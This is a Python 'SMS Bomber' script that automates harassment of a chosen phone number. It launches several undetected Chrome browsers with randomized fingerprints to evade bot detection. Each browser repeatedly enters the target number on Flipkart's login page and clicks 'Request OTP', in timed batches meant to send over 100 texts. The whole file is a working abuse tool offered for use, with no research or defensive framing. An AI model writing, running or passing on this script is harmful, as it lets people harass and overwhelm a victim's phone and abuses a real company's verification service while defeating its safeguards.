import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import threading
import concurrent.futures
import os
import sys
import platform

PHONE_NUMBER = "1234567890"  # <-- Put the target phone number here
BATCH_SIZE = 50             
NUMBER_OF_BATCHES = 3        
MAX_CONCURRENT_BROWSERS = 5  
BATCH_COOLDOWN = (120, 180)  

def random_delay(min_seconds=0.5, max_seconds=1.5):
    """Add a random delay to appear more human-like"""
    time.sleep(random.uniform(min_seconds, max_seconds))

def generate_fingerprint_options():
    """Generate random browser fingerprint to avoid detection"""
    options = uc.ChromeOptions()
    
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-popup-blocking')
    
    # Cross-platform compatibility
    system = platform.system().lower()
    if system == 'linux':
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
    
    resolutions = [
        '1366,768', '1440,900', '1536,864', '1680,1050', 
        '1920,1080', '2560,1440', '1280,720'
    ]
    options.add_argument(f'--window-size={random.choice(resolutions)}')
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    options.add_argument(f'--user-agent={random.choice(user_agents)}')
    
    languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9', 'en-IN,en;q=0.9']
    options.add_argument(f'--lang={random.choice(languages)}')
    
    return options

def send_sms_in_browser(thread_id, attempts_per_thread, batch_num):
    """Function to run in each thread"""
    print(f"[*] Batch {batch_num} - Thread {thread_id} starting...")
    
    startup_delay = random.uniform(1, 5)
    time.sleep(startup_delay)
    
    options = generate_fingerprint_options()
    
    successful = 0
    
    try:
        system = platform.system().lower()
        if system == 'windows':
            browser = uc.Chrome(options=options, use_subprocess=True)
        elif system == 'darwin':  
            browser = uc.Chrome(options=options)
        else:  
            browser = uc.Chrome(options=options, use_subprocess=True)
            
        wait = WebDriverWait(browser, 10) 
        
        for i in range(attempts_per_thread):
            try:
                print(f"[*] Batch {batch_num} - Thread {thread_id} - Attempt {i+1}/{attempts_per_thread}")
                
                browser.get('https://www.flipkart.com/account/login?ret=/')
                random_delay(1, 2)
                
                print(f"[*] Looking for phone input field...")
                
                selectors = [
                    '.r4vIwl.BV\\+Dqf',  
                    'input[type="text"]',
                    '.login-form input',
                    'form input'
                ]
                
                number_field = None
                for selector in selectors:
                    try:
                        number_field = wait.until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        if number_field.is_displayed():
                            print(f"[*] Found input field with selector: {selector}")
                            break
                    except:
                        continue
                
                if not number_field:
                    print(f"[-] Could not find phone input field")
                    continue
                
                number_field.clear()
                number_field.send_keys(PHONE_NUMBER)
                
                print(f"[*] Looking for OTP button with class: QqFHMw twnTnD _7Pd1Fp")
                
                try:
                    otp_button = wait.until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, '.QqFHMw.twnTnD._7Pd1Fp'))
                    )
                    if otp_button.is_displayed():
                        print(f"[+] Found OTP button with exact class!")
                        otp_button.click()
                        random_delay(1, 2)
                        successful += 1
                        print(f"[+] Batch {batch_num} - Thread {thread_id} - SMS sent successfully! ({successful} total)")
                        
                        cooldown = random.uniform(2, 5)
                        time.sleep(cooldown)
                        continue
                except:
                    print(f"[-] Could not find OTP button with exact class, trying alternatives...")
                
                button_found = False
                
                fallback_selectors = [
                    ('css', 'button[type="submit"]'),
                    ('xpath', '//button[contains(text(), "Request OTP")]'),
                    ('xpath', '//span[contains(text(), "Request OTP")]/parent::button'),
                    ('css', 'button'),
                    ('xpath', '//button')
                ]
                
                for selector_type, selector in fallback_selectors:
                    try:
                        if selector_type == 'css':
                            otp_button = wait.until(
                                EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                            )
                        else:
                            otp_button = wait.until(
                                EC.element_to_be_clickable((By.XPATH, selector))
                            )
                            
                        if otp_button.is_displayed():
                            print(f"[*] Found OTP button with fallback: {selector}")
                            otp_button.click()
                            button_found = True
                            break
                    except:
                        continue
                
                if button_found:
                    random_delay(1, 2)
                    successful += 1
                    print(f"[+] Batch {batch_num} - Thread {thread_id} - SMS sent successfully! ({successful} total)")
                else:
                    print(f"[-] Could not find or click OTP button")
                
                cooldown = random.uniform(2, 5)
                time.sleep(cooldown)
                
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                time.sleep(3)
            
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
    finally:
        try:
            browser.quit()
        except:
            pass
        
        return successful

def clear_screen():
    """Clear terminal screen in a cross-platform way"""
    if platform.system().lower() == "windows":
        os.system('cls')
    else:
        os.system('clear')

def run_batch(batch_num):
    """Run a batch of SMS sending"""
    print(f"\n[*] Starting Batch {batch_num}/{NUMBER_OF_BATCHES}")
    print(f"[*] Target Number: {PHONE_NUMBER}")
    print(f"[*] Messages in this batch: {BATCH_SIZE}")
    print(f"[*] Parallel Browsers: {MAX_CONCURRENT_BROWSERS}")
    print(f"[*] Operating System: {platform.system()} {platform.release()}")
    
    start_time = time.time()
    
    attempts_per_thread = BATCH_SIZE // MAX_CONCURRENT_BROWSERS
    if attempts_per_thread < 1:
        attempts_per_thread = 1
        num_threads = BATCH_SIZE
    else:
        num_threads = MAX_CONCURRENT_BROWSERS
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_sms_in_browser, i, attempts_per_thread, batch_num) for i in range(num_threads)]
        
        successful_total = 0
        for future in concurrent.futures.as_completed(futures):
            successful_total += future.result()
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\n=== Batch {batch_num} Summary ===")
    print(f"Attempts: {BATCH_SIZE}")
    print(f"Successful: {successful_total}")
    print(f"Failed: {BATCH_SIZE - successful_total}")
    print(f"Time taken: {duration:.2f} seconds")
    
    return successful_total

def send_sms_bombs():
    # Display a welcome message with platform info
    clear_screen()
    print(f"\n{'='*60}")
    print(f"SMS Bomber - Cross-Platform Edition")
    print(f"Operating System: {platform.system()} {platform.release()} ({platform.machine()})")
    print(f"Python Version: {platform.python_version()}")
    print(f"{'='*60}")
    
    print(f"\n[*] Starting SMS Bomber - BATCH MODE")
    print(f"[*] Target Number: {PHONE_NUMBER}")
    print(f"[*] Total batches: {NUMBER_OF_BATCHES}")
    print(f"[*] Batch size: {BATCH_SIZE}")
    print(f"[*] Total messages to send: {BATCH_SIZE * NUMBER_OF_BATCHES}")
    
    overall_start_time = time.time()
    total_successful = 0
    
    try:
        for batch in range(1, NUMBER_OF_BATCHES + 1):
            batch_successful = run_batch(batch)
            total_successful += batch_successful
            
            if batch < NUMBER_OF_BATCHES:
                cooldown = random.uniform(BATCH_COOLDOWN[0], BATCH_COOLDOWN[1])
                print(f"\n[*] Batch {batch} completed. Cooling down for {cooldown:.1f} seconds before next batch...")
                
                for remaining in range(int(cooldown), 0, -10):
                    sys.stdout.write(f"\r[*] Next batch in {remaining} seconds...")
                    sys.stdout.flush()
                    time.sleep(min(10, remaining))
                print("\r[*] Starting next batch now!                 ")
    
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user")
    
    overall_end_time = time.time()
    overall_duration = overall_end_time - overall_start_time
    
    print("\n=== OVERALL SUMMARY ===")
    print(f"Total attempts: {BATCH_SIZE * NUMBER_OF_BATCHES}")
    print(f"Total successful: {total_successful}")
    print(f"Total failed: {BATCH_SIZE * NUMBER_OF_BATCHES - total_successful}")
    print(f"Total time taken: {overall_duration:.2f} seconds")
    print(f"Average success rate: {(total_successful / (BATCH_SIZE * NUMBER_OF_BATCHES)) * 100:.1f}%")
    
    if total_successful >= 100:
        print("\n[✓] SUCCESS: Sent 100+ messages!")
    else:
        print(f"\n[!] Target not reached: Sent {total_successful}/100 messages")

if __name__ == "__main__":
    if len(PHONE_NUMBER) < 10:
        print("[-] Error: Please enter a valid phone number in the PHONE_NUMBER variable")
    else:
        try:
            send_sms_bombs()
        except KeyboardInterrupt:
            print("\n[!] Process interrupted by user")
            sys.exit(0) 